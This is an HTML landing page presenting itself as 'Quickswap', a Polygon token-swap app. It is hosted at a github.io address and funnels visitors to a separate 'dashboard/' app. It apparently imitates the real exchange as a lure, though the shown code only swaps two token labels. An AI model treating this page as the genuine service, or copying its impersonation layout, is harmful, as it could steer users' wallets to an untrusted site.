<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Quickswap</title>
  <meta name="description" content="Quickswap is the Polygon DEX for swapping tokens from your own wallet.">
  <link rel="canonical" href="https://quickswap-page.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F6F7F8">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Quickswap">
  <meta property="og:description" content="Quickswap is the Polygon DEX for swapping tokens from your own wallet.">
  <meta property="og:url" content="https://quickswap-page.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Quickswap">
  <meta name="twitter:description" content="Quickswap is the Polygon DEX for swapping tokens from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://quickswap-page.github.io/#website",
        "url": "https://quickswap-page.github.io/",
        "name": "Quickswap",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://quickswap-page.github.io/#app",
        "name": "Quickswap",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://quickswap-page.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://quickswap-page.github.io/#organization",
        "name": "Quickswap",
        "url": "https://quickswap-page.github.io/"
      }
    ]
  }
  </script>

  <link rel="prefetch" href="dashboard/">
  <link rel="prerender" href="dashboard/">
</head>
<body>
  <header class="topbar">
    <span class="brand" aria-label="Quickswap">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Quickswap</span>
    </span>
    <nav class="nav" aria-label="Authority references">
      <a href="https://polygonscan.com/" target="_blank" rel="nofollow noopener noreferrer">PolygonScan</a>
      <a href="https://www.coingecko.com/en/coins/quickswap" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
      <a href="https://ethereum.org/developers/docs/scaling/sidechains/" target="_blank" rel="nofollow noopener noreferrer">Sidechains</a>
    </nav>
    <span class="spacer" aria-hidden="true"></span>
    <a class="ghost" href="dashboard/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Quickswap landing">
      <h1>Quickswap</h1>
      <p class="sub"><strong>Quickswap</strong> is the Polygon DEX for swapping tokens from your own wallet.</p>

      <section class="app-card" aria-label="Swap route">
        <div class="route">
          <div class="leg">
            <span class="label">From</span>
            <span class="chip">
              <img src="pol.png" width="30" height="30" alt="POL">
              <span>POL</span>
            </span>
          </div>

          <button class="switch" type="button" data-switch aria-label="Switch direction">
            <span aria-hidden="true">&#8594;</span>
          </button>

          <div class="leg">
            <span class="label">To</span>
            <span class="chip">
              <img src="usdc.png" width="30" height="30" alt="USDC">
              <span>USDC</span>
            </span>
          </div>
        </div>

        <a class="primary" href="dashboard/" rel="noopener noreferrer">Enter App</a>
      </section>
    </section>
  </main>

  <footer class="foot">Quickswap &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length !== 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
</html>
